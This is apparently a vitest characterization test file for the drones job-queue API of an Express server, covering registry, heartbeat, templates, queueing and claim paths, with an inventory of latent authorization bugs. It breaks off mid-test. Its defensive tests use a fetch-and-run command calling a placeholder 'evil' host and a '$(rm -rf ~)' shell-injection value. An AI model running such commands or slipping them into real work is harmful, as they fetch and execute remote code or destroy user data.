import { describe, test, expect, beforeAll, afterAll } from 'vitest'
import { mkdtempSync, rmSync, existsSync, readdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import request from 'supertest'
import express from 'express'

// ============================================================================
// CHARACTERIZATION TESTS — DRONES API (/drones*)
//
// These tests LOCK the CURRENT behavior of the drones domain in
// server/routes/mycelium.js ahead of the god-file decomposition. They pin what
// the code DOES today, not what it should do. Suspicious behaviors are flagged
// with `LATENT:` comments but still asserted as-is — fix nothing here; if a
// refactor changes one of these outcomes on purpose, update the assertion AND
// the comment together.
//
// Harness mirrors studio-login.test.js / drone-mesh-rce.test.js: real router,
// fresh temp DB (DATA_DIR set before the dynamic import), supertest, vitest
// pool:'forks' isolating module-global state (rate limiters, key caches).
//
// Fixtures are built through the REAL routes (POST /admin/agents, POST
// /agents/heartbeat, POST /drones/templates). The raw DB handle is used ONLY
// to backdate started_at for the stale-claim test (same convention as
// db-drone-claim.test.js — time travel has no route).
//
// Rate-limit budgets (module-global, per file run):
//   adminWriteLimiter  ('admin_write:'+ip)        30/min — /admin/agents calls
//   agentWriteLimiter  ('agent_write:'+key-or-ip) 30/min — POST /drones/jobs
// Keep POST /drones/jobs under 30 per identity (admin posts share the IP
// bucket) or the tail of the file starts 429ing.
//
// LATENT-BUG INVENTORY (all locked below, none fixed):
//   L1  GET /drones/:id/status has no project_id==='drone' gate — serves any
//       agent id — and queued_jobs is the GLOBAL pending count, not per-drone.
//   L2  PUT /drones/:id/pause|resume never checks the drone exists — pausing a
//       ghost id returns 200 { ok:true }.
//   L3  PUT /drones/jobs/:id ownership gate is `job.drone_id && ...` — while a
//       job is PENDING (drone_id null) ANY agent may mutate it.
//   L4  PUT /drones/jobs/:id with status:'claimed' and no drone_id body field
//       assigns drone_id = caller identity — an admin's X-Acting-As display
//       name becomes the "drone".
//   L5  DELETE /drones/jobs/:id cancels from ANY status, including 'done' —
//       terminal history is rewritten to 'cancelled'.
//   L6  PUT /assets/link-job is SHADOWED by PUT /assets/:id (registered
//       earlier); parseIntParam('link-job') → null → always 404 'Asset not
//       found'. The bulk link endpoint is unreachable dead code.
//   L7  POST /drones/jobs with unknown job_type → 400, but POST
//       /drones/jobs/from-template with unknown template_id → 404 (asymmetric
//       status for the same failure).
//   L8  GET /drones/:id/compatibility with no diagnostics returns HTTP 200
//       with an { error } body (error-in-200 envelope)… and compatibility
//       never checks the template requires[] against drone capabilities (a
//       diskful CPU box is "compatible" with the 3d_printer template).
//   L9  POST /drones/claim returns after the FIRST render-incompatible match
//       ({ job:null, skipped }) instead of trying the next pending job.
//   L10 Stale-released jobs (Bug #137 sweep in POST /drones/claim) are failed
//       WITHOUT the auto-retry that a route-level failure gets — retry logic
//       lives only in PUT /drones/jobs/:id.
//   L11 Queue-time input_data is NOT validated for shell metacharacters —
//       injection is only caught at claim/render time (C-2 guard).
// ============================================================================

const ADMIN_KEY = 'test-admin-key-0123456789abcdef0123456789abcdef'

let tmpDataDir
let db
let raw // getDB() — ONLY for backdating started_at (stale test)
let app

let DRONE_A_KEY // drone-alpha: caps cpu+gpu, HAS diagnostics (heartbeated system_info)
let DRONE_B_KEY // drone-beta:  caps cpu, NO diagnostics ever
let AGENT_KEY   // lucy-test:   plain agent (project proj-x), never a drone

const DIAG = {
  os: 'linux',
  python_path: '/usr/bin/python3',
  home: '/home/drone',
  username: 'drone',
  cuda_available: true,
  gpu_name: 'RTX 3090',
  gpu_vram_gb: 24,
  disk_free_gb: 100,
}

function api() { return request(app) }
function adminHeaders(req) { return req.set('X-Admin-Key', ADMIN_KEY).set('X-Acting-As', 'm5Max') }

async function registerAgent(id, name, projectId, capabilities) {
  const res = await adminHeaders(api().post('/api/mycelium/admin/agents'))
    .send({ id, name, project_id: projectId, capabilities })
  if (res.status !== 200) throw new Error('test setup: agent registration failed for ' + id + ': ' + JSON.stringify(res.body))
  return res.body.api_key
}

// Queue a raw-command job as admin (raw commands are admin-only, C-1).
async function queueAdminJob(body) {
  const res = await adminHeaders(api().post('/api/mycelium/drones/jobs')).send(body)
  if (res.status !== 200) throw new Error('test setup: admin job queue failed: ' + JSON.stringify(res.body))
  return res.body.id
}

async function getJob(id) {
  const res = await adminHeaders(api().get('/api/mycelium/drones/jobs/' + id))
  return res
}

async function cancelJob(id) {
  const res = await adminHeaders(api().delete('/api/mycelium/drones/jobs/' + id))
  if (res.status !== 200) throw new Error('test cleanup: cancel job ' + id + ' failed: ' + JSON.stringify(res.body))
}

beforeAll(async () => {
  tmpDataDir = mkdtempSync(join(tmpdir(), 'myc-drones-char-'))
  process.env.DATA_DIR = tmpDataDir
  process.env.ADMIN_KEY = ADMIN_KEY
  process.env.JWT_SECRET = 'test-jwt-secret'

  db = await import('../../server/db.js')
  db.initDB() // seeds the 3d_print job template
  raw = db.getDB()

  const routes = (await import('../../server/routes/mycelium.js')).default
  app = express()
  app.use(express.json())
  app.use('/api/mycelium', routes)

  // Drones are agents with project_id === 'drone' — registered via the real admin route.
  DRONE_A_KEY = await registerAgent('drone-alpha', 'Drone Alpha', 'drone', ['cpu', 'gpu'])
  DRONE_B_KEY = await registerAgent('drone-beta', 'Drone Beta', 'drone', ['cpu'])
  AGENT_KEY = await registerAgent('lucy-test', 'Lucy Test', 'proj-x', ['code'])

  // drone-alpha heartbeats with system_info → persists diagnostics (renderJobForDrone
  // input) AND a savepoint (GET /drones enrichment). drone-beta stays diagnostics-less
  // on purpose — several tests depend on that.
  const hb = await api().post('/api/mycelium/agents/heartbeat')
    .set('X-Agent-Key', DRONE_A_KEY)
    .send({
      status: 'online',
      working_on: 'booted',
      state_snapshot: { system_info: DIAG, worker_version: '1.2.3', warnings: ['low disk'] },
    })
  if (hb.status !== 200) throw new Error('test setup: drone-alpha heartbeat failed: ' + JSON.stringify(hb.body))

  // A CPU template whose command interpolates user input (render path + C-2 guard).
  const tpl = await adminHeaders(api().post('/api/mycelium/drones/templates')).send({
    id: 'flux-char',
    name: 'Flux Char',
    requires: ['cpu'],
    command_template: 'python gen.py --prompt "{{prompt}}" --steps {{steps}}',
    workspace_name: 'flux-char',
    artifacts: ['gen.py'],
  })
  if (tpl.status !== 200) throw new Error('test setup: template creation failed: ' + JSON.stringify(tpl.body))
})

afterAll(() => {
  if (tmpDataDir) rmSync(tmpDataDir, { recursive: true, force: true })
})

// ============================================================================
// 1 · REGISTRY — GET /drones, GET /drones/:id, status, pause/resume
// ============================================================================

describe('GET /drones — registry', () => {
  test('lists only project_id="drone" agents, enriched from the latest savepoint', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones'))
    expect(res.status).toBe(200)
    const ids = res.body.map((d) => d.id)
    expect(ids).toContain('drone-alpha')
    expect(ids).toContain('drone-beta')
    expect(ids).not.toContain('lucy-test') // non-drone agents excluded

    const alpha = res.body.find((d) => d.id === 'drone-alpha')
    expect(alpha.project_id).toBe('drone')
    expect(alpha.status).toBe('online')
    // capabilities is served as the RAW JSON string, not parsed (contrast with
    // GET /drones/:id/status which parses it) — clients must JSON.parse.
    expect(alpha.capabilities).toBe('["cpu","gpu"]')
    // savepoint enrichment (from the beforeAll heartbeat)
    expect(alpha.system_info).toMatchObject({ os: 'linux', gpu_name: 'RTX 3090' })
    expect(alpha.worker_version).toBe('1.2.3')
    expect(alpha.warnings).toEqual(['low disk'])
    // listDrones selects a fixed column list — the key hash never leaves the DB
    expect(alpha.api_key_hash).toBeUndefined()

    // drone-beta has never savepointed → no enrichment fields
    const beta = res.body.find((d) => d.id === 'drone-beta')
    expect(beta.system_info).toBeFalsy()
  })

  test('agent keys can read the registry', async () => {
    const res = await api().get('/api/mycelium/drones').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(200)
    expect(Array.isArray(res.body)).toBe(true)
  })

  test('no auth → 401 Missing X-Agent-Key (checkAgentOrAdmin falls through to checkAgent)', async () => {
    const res = await api().get('/api/mycelium/drones')
    expect(res.status).toBe(401)
    expect(res.body.error).toBe('Missing X-Agent-Key header')
  })

  test('invalid agent key → 403 Invalid agent key', async () => {
    const res = await api().get('/api/mycelium/drones').set('X-Agent-Key', 'dvk_' + 'f'.repeat(48))
    expect(res.status).toBe(403)
    expect(res.body.error).toBe('Invalid agent key')
  })

  test('WRONG admin key (no agent key) → 401 Missing X-Agent-Key, not a 403 about the admin key', async () => {
    // isAdminKey() fails silently and checkAgentOrAdmin falls through to the
    // agent-key path — the response never mentions the bad admin key.
    const res = await api().get('/api/mycelium/drones').set('X-Admin-Key', 'wrong-admin-key')
    expect(res.status).toBe(401)
    expect(res.body.error).toBe('Missing X-Agent-Key header')
  })
})

describe('GET /drones/:id — single drone detail', () => {
  test('returns safe agent + recent_jobs + diagnostics + profiles; never the key hash', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/drone-alpha'))
    expect(res.status).toBe(200)
    expect(res.body.id).toBe('drone-alpha')
    expect(res.body.api_key_hash).toBeUndefined()
    expect(Array.isArray(res.body.recent_jobs)).toBe(true)
    expect(res.body.system_info).toMatchObject({ os: 'linux' })
    expect(res.body.worker_version).toBe('1.2.3')
    expect(res.body.profiles).toEqual([])
  })

  test('a non-drone agent id is 404 (project gate)', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/lucy-test'))
    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Drone not found')
  })

  test('unknown id → 404', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/ghost-drone'))
    expect(res.status).toBe(404)
  })
})

describe('GET /drones/:id/status', () => {
  test('returns parsed capabilities + global queued_jobs count', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/drone-alpha/status'))
    expect(res.status).toBe(200)
    expect(res.body.id).toBe('drone-alpha')
    expect(res.body.capabilities).toEqual(['cpu', 'gpu']) // parsed here (string in GET /drones)
    expect(res.body.queued_jobs).toBe(0) // queue is empty at this point in the file
  })

  test('LATENT L1: a NON-drone agent id also gets a 200 status (no project gate)', async () => {
    // getDroneStatus() looks up the agents table with no project_id='drone'
    // filter — any agent id is served as if it were a drone.
    const res = await adminHeaders(api().get('/api/mycelium/drones/lucy-test/status'))
    expect(res.status).toBe(200)
    expect(res.body.id).toBe('lucy-test')
  })

  test('unknown id → 404 Drone not found', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/ghost-drone/status'))
    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Drone not found')
  })
})

describe('PUT /drones/:id/pause + /resume', () => {
  test('pause → { ok, status:paused }; agent row shows paused + canned working_on', async () => {
    const res = await adminHeaders(api().put('/api/mycelium/drones/drone-beta/pause'))
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ ok: true, status: 'paused' })
    const status = await adminHeaders(api().get('/api/mycelium/drones/drone-beta/status'))
    expect(status.body.status).toBe('paused')
    expect(status.body.working_on).toBe('Paused (GPU released)')
  })

  test('resume → { ok, status:online }; working_on cleared', async () => {
    const res = await adminHeaders(api().put('/api/mycelium/drones/drone-beta/resume'))
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ ok: true, status: 'online' })
    const status = await adminHeaders(api().get('/api/mycelium/drones/drone-beta/status'))
    expect(status.body.status).toBe('online')
    expect(status.body.working_on).toBe('')
  })

  test('LATENT L2: pausing a NONEXISTENT drone still returns 200 { ok:true }', async () => {
    // pauseDrone() runs an UPDATE that matches zero rows and unconditionally
    // returns { ok:true, status:'paused' } — no existence check anywhere.
    const res = await adminHeaders(api().put('/api/mycelium/drones/ghost-drone/pause'))
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ ok: true, status: 'paused' })
  })
})

// ============================================================================
// 2 · REGISTRATION + HEARTBEAT (how a drone joins and stays alive)
// ============================================================================

describe('POST /admin/agents — drone registration', () => {
  test('success returns one-time plaintext key + MCP config', async () => {
    const res = await adminHeaders(api().post('/api/mycelium/admin/agents'))
      .send({ id: 'scratch-agent', name: 'Scratch', project_id: 'proj-x', capabilities: ['code'] })
    expect(res.status).toBe(200)
    expect(res.body.id).toBe('scratch-agent')
    expect(res.body.api_key).toMatch(/^dvk_[0-9a-f]{48}$/)
    expect(res.body.mcp_config.mcpServers.mycelium.env.MYCELIUM_AGENT_ID).toBe('scratch-agent')
    expect(res.body.message).toMatch(/Store this key/)
  })

  test('duplicate id → 409', async () => {
    const res = await adminHeaders(api().post('/api/mycelium/admin/agents'))
      .send({ id: 'drone-alpha', name: 'Dup', project_id: 'drone' })
    expect(res.status).toBe(409)
    expect(res.body.error).toBe('Agent drone-alpha already exists')
  })

  test('missing required fields → 400', async () => {
    const res = await adminHeaders(api().post('/api/mycelium/admin/agents'))
      .send({ id: 'incomplete' })
    expect(res.status).toBe(400)
    expect(res.body.error).toBe('id, name, and project_id are required')
  })

  test('agent key alone → 403 "Admin role required" (findings-§1 fix: authenticated, not authorized)', async () => {
    const res = await api().post('/api/mycelium/admin/agents')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ id: 'nope', name: 'Nope', project_id: 'drone' })
    expect(res.status).toBe(403)
    expect(res.body.error).toBe('Admin role required')
  })

  test('wrong admin key → 403 Invalid admin key', async () => {
    const res = await api().post('/api/mycelium/admin/agents')
      .set('X-Admin-Key', 'wrong')
      .send({ id: 'nope', name: 'Nope', project_id: 'drone' })
    expect(res.status).toBe(403)
    expect(res.body.error).toBe('Invalid admin key')
  })
})

describe('POST /agents/heartbeat — drone liveness + diagnostics ingestion', () => {
  test('drone heartbeat → { ok, pending, wake }; status + working_on land on the agent row', async () => {
    const res = await api().post('/api/mycelium/agents/heartbeat')
      .set('X-Agent-Key', DRONE_B_KEY)
      .send({ status: 'online', working_on: 'idling' })
    expect(res.status).toBe(200)
    expect(res.body.ok).toBe(true)
    expect(typeof res.body.pending).toBe('number')
    expect(typeof res.body.wake).toBe('boolean')
    const status = await adminHeaders(api().get('/api/mycelium/drones/drone-beta/status'))
    expect(status.body.status).toBe('online')
    expect(status.body.working_on).toBe('idling')
  })

  test('invalid status → 400 machine-readable invalid_enum', async () => {
    const res = await api().post('/api/mycelium/agents/heartbeat')
      .set('X-Agent-Key', DRONE_B_KEY)
      .send({ status: 'sleepwalking' })
    expect(res.status).toBe(400)
    expect(res.body.code).toBe('invalid_enum')
    expect(res.body.field).toBe('status')
    expect(res.body.allowed).toEqual(['online', 'offline', 'idle', 'busy'])
  })

  test('no key → 401', async () => {
    const res = await api().post('/api/mycelium/agents/heartbeat').send({ status: 'online' })
    expect(res.status).toBe(401)
  })

  test('admin can heartbeat ON BEHALF of a drone via agent_id', async () => {
    const res = await api().post('/api/mycelium/agents/heartbeat')
      .set('X-Admin-Key', ADMIN_KEY)
      .send({ agent_id: 'drone-alpha', status: 'online', working_on: 'rendering' })
    expect(res.status).toBe(200)
    expect(res.body.ok).toBe(true)
    const status = await adminHeaders(api().get('/api/mycelium/drones/drone-alpha/status'))
    expect(status.body.working_on).toBe('rendering')
  })
})

// ============================================================================
// 3 · JOB TEMPLATES — /drones/templates
// ============================================================================

describe('job templates — /drones/templates', () => {
  test('list (agent-readable) includes the seeded 3d_print template, raw-row shape', async () => {
    const res = await api().get('/api/mycelium/drones/templates').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(200)
    const ids = res.body.map((t) => t.id)
    expect(ids).toContain('3d_print') // seeded by initDB
    expect(ids).toContain('flux-char')
    const seeded = res.body.find((t) => t.id === '3d_print')
    expect(seeded.requires).toBe('["3d_printer"]') // JSON string, not parsed
  })

  test('get single returns the raw row with creation defaults', async () => {
    const res = await api().get('/api/mycelium/drones/templates/flux-char').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(200)
    expect(res.body.name).toBe('Flux Char')
    expect(res.body.command_template).toBe('python gen.py --prompt "{{prompt}}" --steps {{steps}}')
    expect(res.body.workspace_name).toBe('flux-char')
    expect(res.body.requires).toBe('["cpu"]')
    expect(res.body.artifacts).toBe('["gen.py"]')
    expect(res.body.min_vram_gb).toBe(0) // default
    expect(res.body.min_disk_gb).toBe(5) // default
  })

  test('get unknown → 404', async () => {
    const res = await api().get('/api/mycelium/drones/templates/ghost').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Template not found')
  })

  test('create is admin-only: agent key → 403, wrong admin key → 403', async () => {
    const asAgent = await api().post('/api/mycelium/drones/templates')
      .set('X-Agent-Key', AGENT_KEY).send({ id: 'sneaky' })
    expect(asAgent.status).toBe(403) // findings-§1 fix: authenticated agent, not authorized
    const badKey = await api().post('/api/mycelium/drones/templates')
      .set('X-Admin-Key', 'wrong').send({ id: 'sneaky' })
    expect(badKey.status).toBe(403)
  })

  test('create / duplicate / missing-id contract', async () => {
    const created = await adminHeaders(api().post('/api/mycelium/drones/templates'))
      .send({ id: 'scratch-tmpl', name: 'Scratch Template', requires: ['cpu'] })
    expect(created.status).toBe(200)
    expect(created.body.id).toBe('scratch-tmpl')

    const dup = await adminHeaders(api().post('/api/mycelium/drones/templates'))
      .send({ id: 'scratch-tmpl', name: 'Again' })
    expect(dup.status).toBe(409)
    expect(dup.body.error).toBe('Template already exists: scratch-tmpl')

    const noId = await adminHeaders(api().post('/api/mycelium/drones/templates')).send({ name: 'No Id' })
    expect(noId.status).toBe(400)
    expect(noId.body.error).toBe('id is required')
  })

  test('update returns the updated row; unknown → 404', async () => {
    const res = await adminHeaders(api().put('/api/mycelium/drones/templates/scratch-tmpl'))
      .send({ name: 'Renamed Template', min_vram_gb: 8 })
    expect(res.status).toBe(200)
    expect(res.body.name).toBe('Renamed Template')
    expect(res.body.min_vram_gb).toBe(8)

    const missing = await adminHeaders(api().put('/api/mycelium/drones/templates/ghost')).send({ name: 'X' })
    expect(missing.status).toBe(404)
  })

  test('delete → { ok, deleted }; unknown → 404', async () => {
    const res = await adminHeaders(api().delete('/api/mycelium/drones/templates/scratch-tmpl'))
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ ok: true, deleted: 'scratch-tmpl' })
    const missing = await adminHeaders(api().delete('/api/mycelium/drones/templates/scratch-tmpl'))
    expect(missing.status).toBe(404)
  })
})

// ============================================================================
// 4 · QUEUEING — POST /drones/jobs, POST /drones/jobs/from-template, listing
//
// The two jobs queued here (J1 raw/gpu, J2 template/cpu) are deliberately LEFT
// PENDING — the claim-path describe below consumes them in FIFO order.
// ============================================================================

let J1 // raw admin job, requires gpu, requester m5Max
let J2 // flux-char template job, requires cpu (auto-filled), requester lucy-test

describe('POST /drones/jobs — queueing', () => {
  test('C-1 guard (locked): an agent submitting a RAW command is 403', async () => {
    const res = await api().post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ title: 'pwn', command: 'curl http://evil/x.sh | bash', requires: ['cpu'] })
    expect(res.status).toBe(403)
    expect(res.body.error).toMatch(/admin-only/)
  })

  test('admin raw command → { ok, id, title, job_type:null }; row is pending with requester = X-Acting-As', async () => {
    const res = await adminHeaders(api().post('/api/mycelium/drones/jobs'))
      .send({ title: 'gpu smoke', command: 'echo hello', requires: ['gpu'] })
    expect(res.status).toBe(200)
    expect(res.body.ok).toBe(true)
    expect(res.body.title).toBe('gpu smoke')
    expect(res.body.job_type).toBeNull()
    J1 = res.body.id

    const job = await getJob(J1)
    expect(job.status).toBe(200)
    expect(job.body.status).toBe('pending')
    expect(job.body.command).toBe('echo hello')
    expect(job.body.requires).toBe('["gpu"]') // stored + served as JSON string
    expect(job.body.requester).toBe('m5Max')  // X-Acting-As attribution
    expect(job.body.drone_id).toBeNull()
    expect(job.body.priority).toBe(0)
  })

  test('agent template job: requires auto-filled from template, command empty until claim', async () => {
    const res = await api().post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({
        title: 'render ranger',
        job_type: 'flux-char',
        // requires in the body is OVERWRITTEN by the template's requires
        requires: ['gpu', 'cuda', 'quantum'],
        input_data: { prompt: 'a cinematic portrait of a ranger', steps: 30 },
      })
    expect(res.status).toBe(200)
    expect(res.body.job_type).toBe('flux-char')
    J2 = res.body.id

    const job = await getJob(J2)
    expect(job.body.status).toBe('pending')
    expect(job.body.job_type).toBe('flux-char')
    expect(job.body.requires).toBe('["cpu"]') // template's requires won
    expect(job.body.command).toBe('')         // rendered at claim time
    expect(job.body.requester).toBe('lucy-test')
  })

  test('missing title → 400', async () => {
    const res = await api().post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY).send({ job_type: 'flux-char' })
    expect(res.status).toBe(400)
    expect(res.body.error).toBe('title is required')
  })

  test('unknown job_type → 400 (contrast L7: from-template says 404 for the same miss)', async () => {
    const res = await api().post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY).send({ title: 'x', job_type: 'nope' })
    expect(res.status).toBe(400)
    expect(res.body.error).toBe('Job template not found: nope')
  })

  test('unknown profile_id → 400', async () => {
    const res = await api().post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY).send({ title: 'x', job_type: 'flux-char', profile_id: 'ghost' })
    expect(res.status).toBe(400)
    expect(res.body.error).toBe('Profile not found: ghost')
  })

  test('title is HTML-escaped on write; admin without X-Acting-As is requester __system__', async () => {
    const res = await api().post('/api/mycelium/drones/jobs')
      .set('X-Admin-Key', ADMIN_KEY) // no X-Acting-As
      .send({ title: '<b>hi</b>', command: 'echo x', requires: ['cpu'] })
    expect(res.status).toBe(200)
    expect(res.body.title).toBe('&lt;b&gt;hi&lt;/b&gt;') // escapeHtml applied
    const job = await getJob(res.body.id)
    expect(job.body.title).toBe('&lt;b&gt;hi&lt;/b&gt;')
    expect(job.body.requester).toBe('__system__')
    await cancelJob(res.body.id) // keep the claim queue deterministic
  })
})

describe('POST /drones/jobs/from-template', () => {
  test('missing template_id → 400; unknown → 404 (LATENT L7 asymmetry vs /drones/jobs 400)', async () => {
    const missing = await api().post('/api/mycelium/drones/jobs/from-template')
      .set('X-Agent-Key', AGENT_KEY).send({})
    expect(missing.status).toBe(400)
    expect(missing.body.error).toBe('template_id is required')

    const unknown = await api().post('/api/mycelium/drones/jobs/from-template')
      .set('X-Agent-Key', AGENT_KEY).send({ template_id: 'nope' })
    expect(unknown.status).toBe(404)
    expect(unknown.body.error).toBe('Template not found: nope')
  })

  test('title comes from template name (+ batch suffix); job_type set', async () => {
    const res = await api().post('/api/mycelium/drones/jobs/from-template')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ template_id: 'flux-char', input_data: { batch: 3, prompt: 'x', steps: 1 } })
    expect(res.status).toBe(200)
    expect(res.body.title).toBe('Flux Char (batch 3)')
    expect(res.body.job_type).toBe('flux-char')
    const job = await getJob(res.body.id)
    expect(job.body.status).toBe('pending')
    expect(job.body.requires).toBe('["cpu"]')
    await cancelJob(res.body.id) // keep the claim queue at exactly J1+J2
  })
})

describe('GET /drones/jobs — listing + filters', () => {
  test('?status filter returns only matching jobs; raw rows', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ status: 'pending' }))
    expect(res.status).toBe(200)
    const ids = res.body.map((j) => j.id)
    expect(ids).toContain(J1)
    expect(ids).toContain(J2)
    expect(res.body.every((j) => j.status === 'pending')).toBe(true)
  })

  test('?requester filter', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ requester: 'lucy-test' }))
    const ids = res.body.map((j) => j.id)
    expect(ids).toContain(J2)
    expect(ids).not.toContain(J1)
  })

  test('unknown status value is NOT rejected — silently returns [] (no enum validation on the filter)', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ status: 'bogus' }))
    expect(res.status).toBe(200)
    expect(res.body).toEqual([])
  })

  test('?limit caps the page', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ limit: 1 }))
    expect(res.status).toBe(200)
    expect(res.body.length).toBe(1)
  })

  test('no auth → 401', async () => {
    const res = await api().get('/api/mycelium/drones/jobs')
    expect(res.status).toBe(401)
  })

  test('GET /drones/jobs/:id — unknown numeric id and non-numeric id both 404', async () => {
    const missing = await adminHeaders(api().get('/api/mycelium/drones/jobs/999999'))
    expect(missing.status).toBe(404)
    expect(missing.body.error).toBe('Drone job not found')
    const nan = await adminHeaders(api().get('/api/mycelium/drones/jobs/abc'))
    expect(nan.status).toBe(404) // parseIntParam → null → not found
  })
})

// ============================================================================
// 5 · CLAIM PATH + JOB STATE MACHINE
//    pending → claimed → done | failed(→auto-retry) | cancelled
// Queue entering this block: J1 (raw, gpu), J2 (flux-char, cpu). FIFO order.
// ============================================================================

describe('POST /drones/claim — the drone work loop', () => {
  test('admin key alone cannot claim — checkAgent demands an agent key (401)', async () => {
    const res = await adminHeaders(api().post('/api/mycelium/drones/claim')).send({ capabilities: ['cpu'] })
    expect(res.status).toBe(401)
    expect(res.body.error).toBe('Missing X-Agent-Key header')
  })

  test('LATENT L9: diagnostics-less drone matching a template job gets { job:null, skipped } and STOPS (job unclaimed back to pending)', async () => {
    // drone-beta (cpu, never sent system_info) matches J2 (cpu template job),
    // but renderJobForDrone can't resolve platform vars → the route unclaims J2
    // and returns skipped WITHOUT trying any other pending job.
    const res = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_B_KEY).send({ capabilities: ['cpu'] })
    expect(res.status).toBe(200)
    expect(res.body.job).toBeNull()
    expect(res.body.skipped).toBeTruthy()
    expect(res.body.skipped.job_id).toBe(J2)
    expect(res.body.skipped.reason).toMatch(/No diagnostics available/)

    const job = await getJob(J2)
    expect(job.body.status).toBe('pending') // unclaimed
    expect(job.body.drone_id).toBeNull()
    expect(job.body.started_at).toBeNull()
  })

  test('capability match is FIFO: drone-alpha (cpu+gpu) claims J1 first; raw command passes through verbatim', async () => {
    const res = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_A_KEY).send({ capabilities: ['cpu', 'gpu'] })
    expect(res.status).toBe(200)
    expect(res.body.job.id).toBe(J1)
    expect(res.body.job.status).toBe('claimed')
    expect(res.body.job.drone_id).toBe('drone-alpha')
    expect(res.body.job.command).toBe('echo hello')
    expect(res.body.job.started_at).toBeTruthy()
  })

  test('template job claim renders the command server-side and enriches input_data', async () => {
    const res = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_A_KEY).send({ capabilities: ['cpu', 'gpu'] })
    expect(res.status).toBe(200)
    expect(res.body.job.id).toBe(J2)
    expect(res.body.job.command).toBe('python gen.py --prompt "a cinematic portrait of a ranger" --steps 30')

    const inputData = JSON.parse(res.body.job.input_data)
    expect(inputData.prompt).toBe('a cinematic portrait of a ranger') // original input preserved
    expect(inputData.workspace_dir).toBe('flux-char')
    expect(inputData.artifacts).toEqual(['gen.py'])   // template artifacts merged in
    expect(Array.isArray(inputData.setup_steps)).toBe(true)
  })

  test('?drone_id filter now shows both claims on drone-alpha', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ drone_id: 'drone-alpha' }))
    const ids = res.body.map((j) => j.id)
    expect(ids).toContain(J1)
    expect(ids).toContain(J2)
    expect(res.body.every((j) => j.drone_id === 'drone-alpha')).toBe(true)
  })

  test('empty queue → { job:null, stale_released:0 }', async () => {
    const res = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_A_KEY).send({ capabilities: ['cpu', 'gpu'] })
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ job: null, stale_released: 0 })
  })

  test('C-2 guard (locked) + LATENT L11: injection input queues fine but is REJECTED at claim/render time', async () => {
    // Queue-time accepts the payload untouched (L11 — no validation here)…
    const queued = await api().post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ title: 'inject', job_type: 'flux-char', input_data: { prompt: '$(rm -rf ~)', steps: 1 } })
    expect(queued.status).toBe(200)

    // …the render guard fires at claim: job skipped and returned to pending.
    const claim = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_A_KEY).send({ capabilities: ['cpu', 'gpu'] })
    expect(claim.status).toBe(200)
    expect(claim.body.job).toBeNull()
    expect(claim.body.skipped.job_id).toBe(queued.body.id)
    expect(claim.body.skipped.reason).toMatch(/disallowed shell characters/)

    const job = await getJob(queued.body.id)
    expect(job.body.status).toBe('pending')
    expect(job.body.drone_id).toBeNull()
    await cancelJob(queued.body.id)
  })
})

describe('PUT /drones/jobs/:id — completion, auth scoping, auto-retry', () => {
  test('drone completes its job with the "completed" alias → stored as done, completed_at + results set', async () => {
    const res = await api().put('/api/mycelium/drones/jobs/' + J1)
      .set('X-Agent-Key', DRONE_A_KEY)
      .send({ status: 'completed', result_url: 'http://x/out.png', result_data: { frames: 10 } })
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ ok: true, id: J1 })

    const job = await getJob(J1)
    expect(job.body.status).toBe('done') // alias normalized
    expect(job.body.completed_at).toBeTruthy()
    expect(job.body.result_url).toBe('http://x/out.png')
    expect(JSON.parse(job.body.result_data)).toEqual({ frames: 10 })
  })

  test('invalid status → 400 invalid_enum listing the full drone_job lifecycle', async () => {
    const res = await api().put('/api/mycelium/drones/jobs/' + J2)
      .set('X-Agent-Key', DRONE_A_KEY).send({ status: 'exploded' })
    expect(res.status).toBe(400)
    expect(res.body.code).toBe('invalid_enum')
    expect(res.body.allowed).toEqual(['pending', 'claimed', 'done', 'completed', 'failed', 'cancelled', 'dismissed'])
  })

  test('an unrelated agent cannot update an ASSIGNED job (403)', async () => {
    // J1: drone_id=drone-alpha, requester=m5Max — lucy-test is neither.
    const res = await api().put('/api/mycelium/drones/jobs/' + J1)
      .set('X-Agent-Key', AGENT_KEY).send({ error: 'sabotage' })
    expect(res.status).toBe(403)
    expect(res.body.error).toBe('Not authorized to update this job')
  })

  test('LATENT L3: while a job is PENDING (drone_id null) ANY agent may mutate it', async () => {
